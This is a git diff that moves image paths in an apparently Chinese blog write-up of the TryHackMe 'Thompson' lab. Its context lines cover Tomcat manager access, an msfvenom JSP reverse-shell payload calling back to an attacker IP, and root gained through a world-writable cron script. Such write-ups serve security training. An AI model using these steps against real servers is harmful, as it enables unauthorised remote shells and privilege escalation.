@@ -13,7 +13,7 @@ tags: []
 
 > nmap扫描
 
-![image-20241226142025415](./2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142025415.png)
+![image-20241226142025415](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142025415.png)
 
 > 8080端口截图
 
@@ -21,11 +21,11 @@ tags: []
 
 8080端口是一个`tomcat`，理所当然的查看`manager`路径，登录页面需要账号密码。
 
-![image-20241226142311254](./2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142311254.png)
+![image-20241226142311254](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142311254.png)
 
 到此为止，我一开始觉得思路就很清晰了，我只需要通过任意文件读取的漏洞查看到`conf/tomcat-user.xml`中的账号密码就可以了。事实并非如此，任意文件读取就是一个兔子洞，我在这里浪费了太多的时间，其实只需要按下`Cancel`按钮，就可以直接看到密码......
 
-![image-20241226142458987](./2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142458987-1735195042433-6.png)
+![image-20241226142458987](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142458987.png)
 
 > zhei您受得了吗。
 
@@ -41,11 +41,11 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.14.95.76 LPORT=1234 -f war -o sh
 
 偷个懒，就不复现一遍了。
 
-![image-20241226142721955](./2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142721955.png)
+![image-20241226142721955](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142721955.png)
 
 ## root
 
-![image-20241226142849270](./2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142849270.png)
+![image-20241226142849270](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226142849270.png)
 
 到`jack`哥哥的家目录下。可以发现一个`id.sh`。里面内容大致如下（这里的已经被我修改了）。
 
@@ -57,7 +57,7 @@ id > test.txt
 
 同时查看定时任务发现，这是`root`的定时任务，每分钟执行。我看到命令行内容第一反应是劫持环境变量提权，但是这里注意权限，我们对`id.s`h是可读可写可执行。所以我们只要修改sh脚本的内容，就可以得到我们想要的`root.txt`
 
-![image-20241226143347446](./2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226143347446.png)
+![image-20241226143347446](../assets/img/2024-12-26-%5Bthm%5D%20Thompson.assets/image-20241226143347446.png)
 
 > own~
 
